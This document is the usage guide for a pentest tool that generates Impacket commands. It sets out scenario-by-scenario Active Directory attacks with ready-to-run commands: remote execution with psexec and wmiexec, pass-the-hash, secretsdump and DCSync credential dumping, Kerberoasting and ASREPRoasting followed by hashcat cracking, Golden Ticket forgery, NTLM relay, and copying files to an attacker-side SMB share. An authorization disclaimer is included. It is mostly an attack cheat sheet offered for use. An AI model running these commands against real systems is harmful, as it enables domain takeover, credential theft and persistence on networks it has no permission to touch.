# ♥ Impacket Command Generator - Usage Guide ♥

Complete guide to using Panko's Impacket Command Generator! 💜

---

## 🎯 Quick Start

### 1. Open the Tool

```bash
# Navigate to directory
cd /home/kali/impacket-generator

# Start local server
python3 -m http.server 8000

# Open in browser
# http://localhost:8000
```

### 2. Configure Your Parameters

The top section has input fields for all common parameters:

**Essential Parameters:**
- **Domain:** Your target domain (e.g., `CORP`, `CONTOSO`)
- **Username:** User account (e.g., `administrator`, `jdoe`)
- **Password:** Account password
- **Target IP:** Target machine IP address
- **DC IP:** Domain Controller IP address

**Advanced Parameters:**
- **NTLM Hash:** For Pass-the-Hash attacks
- **AES Key:** For Overpass-the-Hash
- **SPN:** Service Principal Names for Kerberos
- **Domain SID:** For Golden/Silver ticket creation

---

## 📋 Common Scenarios

### Scenario 1: Initial Access with Credentials

**Goal:** You have valid domain credentials and want to execute commands remotely.

**Steps:**
1. Fill in:
   - Domain: `CORP`
   - Username: `jdoe`
   - Password: `Summer2023!`
   - Target: `192.168.1.50`

2. Click "Remote Execution" category
3. Choose your method:
   - `psexec.py` - Most common, requires admin
   - `wmiexec.py` - Stealthier
   - `smbexec.py` - No binary upload

4. Copy the command and run it!

**Example Output:**
```bash
psexec.py CORP/jdoe:Summer2023!@192.168.1.50 whoami
```

---

### Scenario 2: Pass-the-Hash Attack

**Goal:** You dumped NTLM hashes and want to use them without cracking.

**Steps:**
1. Fill in:
   - Domain: `CORP`
   - Username: `administrator`
   - NTLM Hash: `aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0`
   - Target: `192.168.1.50`

2. Filter to "execution" + "hash" tags
3. Choose `psexec.py (NTLM hash)` or similar

**Example Output:**
```bash
psexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 CORP/administrator@192.168.1.50
```

---

### Scenario 3: Credential Dumping

**Goal:** Dump all domain credentials from a compromised Domain Controller.

**Steps:**
1. Fill in:
   - Domain: `CORP`
   - Username: `administrator`
   - Password: `P@ssw0rd!`
   - Target: `192.168.1.5` (DC IP)

2. Click "Credential Dumping" category
3. Choose `secretsdump.py (remote)` for everything
4. Or `secretsdump.py (DC Sync)` for just NTLM hashes

**Example Output:**
```bash
secretsdump.py CORP/administrator:P@ssw0rd!@192.168.1.5
```

**What you get:**
- SAM database hashes
- LSA secrets
- NTDS.dit (all domain hashes)

---

### Scenario 4: Kerberoasting

**Goal:** Request service tickets for crackable accounts.

**Steps:**
1. Fill in:
   - Domain: `CORP`
   - Username: `lowpriv`
   - Password: `user123`
   - DC IP: `192.168.1.5`

2. Click "Kerberos Attacks" category
3. Choose `GetUserSPNs.py (Kerberoast)`

**Example Output:**
```bash
GetUserSPNs.py CORP/lowpriv:user123 -dc-ip 192.168.1.5 -request -outputfile kerberoast.txt
```

**Then crack:**
```bash
hashcat -m 13100 kerberoast.txt wordlist.txt
```

---

### Scenario 5: ASREPRoasting

**Goal:** Get hashes for users without Kerberos pre-authentication.

**Steps:**
1. Fill in:
   - Domain: `CORP`
   - (No username/password needed!)

2. Click "Kerberos Attacks" category
3. Choose `GetNPUsers.py (ASREPRoast)`

**Example Output:**
```bash
GetNPUsers.py CORP/ -usersfile users.txt -format hashcat -outputfile hashes.txt
```

**Then crack:**
```bash
hashcat -m 18200 hashes.txt wordlist.txt
```

---

### Scenario 6: Golden Ticket Attack

**Goal:** Create a Golden Ticket for domain persistence.

**Prerequisites:**
- KRBTGT account NTLM hash
- Domain SID

**Steps:**
1. Fill in:
   - Domain: `CORP`
   - Username: `administrator` (or any user)
   - KRBTGT Hash: `<hash from secretsdump>`
   - Domain SID: `S-1-5-21-...`

2. Click "Kerberos Attacks" category
3. Choose `ticketer.py (Golden Ticket)`

**Example Output:**
```bash
ticketer.py -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain CORP administrator
```

**Use the ticket:**
```bash
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass CORP/administrator@dc.corp.local
```

---

### Scenario 7: NTLM Relay Attack

**Goal:** Relay NTLM authentication to compromise targets.

**Steps:**
1. Prepare targets file:
```bash
echo "192.168.1.50" > targets.txt
echo "192.168.1.51" >> targets.txt
```

2. Click "Relay Attacks" category
3. Choose appropriate relay method:
   - `ntlmrelayx.py (SMB relay)` - Basic relay
   - `ntlmrelayx.py (dump SAM)` - Dump credentials
   - `ntlmrelayx.py (LDAP)` - Escalate privileges

**Example Output:**
```bash
ntlmrelayx.py -tf targets.txt -smb2support --sam
```

**Trigger authentication:**
- Responder
- mitm6
- Coercion techniques

---

### Scenario 8: SMB File Transfer

**Goal:** Set up SMB server to transfer files.

**Steps:**
1. Fill in:
   - Share Name: `share`
   - Local Path: `/tmp/loot`

2. Click "SMB Operations" category
3. Choose `smbserver.py`

**Example Output:**
```bash
smbserver.py share /tmp/loot -smb2support
```

**On target (Windows):**
```cmd
copy important.txt \\10.10.14.5\share\
```

---

### Scenario 9: DCSync Attack

**Goal:** Extract password hashes without touching NTDS.dit file.

**Steps:**
1. Fill in:
   - Domain: `CORP`
   - Username: `compromised_admin`
   - Password: `<password>`
   - Target: `192.168.1.5` (DC)
   - Target User: `Administrator` (optional, for specific user)

2. Click "Credential Dumping" category
3. Choose `secretsdump.py (DC Sync)` or `(specific user)`

**Example Output:**
```bash
secretsdump.py -just-dc-ntlm CORP/compromised_admin:password@192.168.1.5
```

---

## 🎨 Interface Tips

### Category Filtering

**Click categories to filter:**
- **All Commands** - Show everything
- **Remote Execution** - psexec, wmiexec, etc.
- **Credential Dumping** - secretsdump variations
- **Kerberos Attacks** - Ticket-related attacks
- **SMB Operations** - File sharing, enumeration
- **Relay Attacks** - ntlmrelayx
- **Enumeration** - Information gathering

**Multiple categories:**
- Click multiple categories to combine filters
- Click "All Commands" to reset

### Search Bar

**Search by:**
- Tool name: `psexec`
- Attack type: `golden ticket`
- Protocol: `kerberos`
- Action: `dump`

### Dark Mode

- Click the 🌙 moon icon in top-right
- Preference is saved in browser

### Copy Commands

- **Copy** button - Copy individual command
- **Copy All** button - Copy all visible commands

---

## 🛠️ Customization

### Save Your Configs

The parameter fields are perfect for saving common configurations:

```bash
# Save as bookmark with filled parameters
# Or use browser's form autofill
```

### Add Custom Commands

Edit `js/data.js` to add your own command templates:

```javascript
{
    name: "My Custom Command",
    command: "customtool.py {domain}/{username}@{target}",
    meta: ["custom", "category"],
    description: "What this does",
    params: ["domain", "username", "target"]
}
```

---

## 📖 Impacket Cheat Sheet

### Common Flags

```bash
# Authentication
-hashes :NTLMHASH              # Pass-the-Hash
-aesKey AESKEY                 # Pass-the-Key (AES)
-k                             # Use Kerberos auth
-no-pass                       # No password (for TGT from ccache)

# Kerberos
-dc-ip IP                      # Domain Controller IP
-target-domain DOMAIN          # Target domain
-debug                         # Verbose output

# Output
-outputfile FILE               # Save output to file
-format hashcat/john           # Hash format
-request                       # Request tickets
```

### File Locations

```bash
# Ticket cache
export KRB5CCNAME=ticket.ccache

# Impacket examples location
/usr/share/doc/python3-impacket/examples/

# Or if installed via pip
~/.local/bin/
```

---

## ⚠️ Important Notes

### Always Get Authorization!

- Only test systems you own or have written permission
- Unauthorized access is illegal
- Follow responsible disclosure

### Operational Security

- Use VPN/proxy when appropriate
- Clean up artifacts after testing
- Document everything
- Secure your loot

### Common Issues

**"Kerberos SessionError: KDC_ERR_PREAUTH_FAILED"**
- Wrong password
- Account might be locked
- Check domain/username format

**"STATUS_ACCESS_DENIED"**
- Insufficient privileges
- SMB signing might be required
- Try different execution method

**"Connection refused"**
- Port blocked by firewall
- Service not running
- Check IP address

---

**made with love by panko** ♥

**happy pentesting!** 💜✨
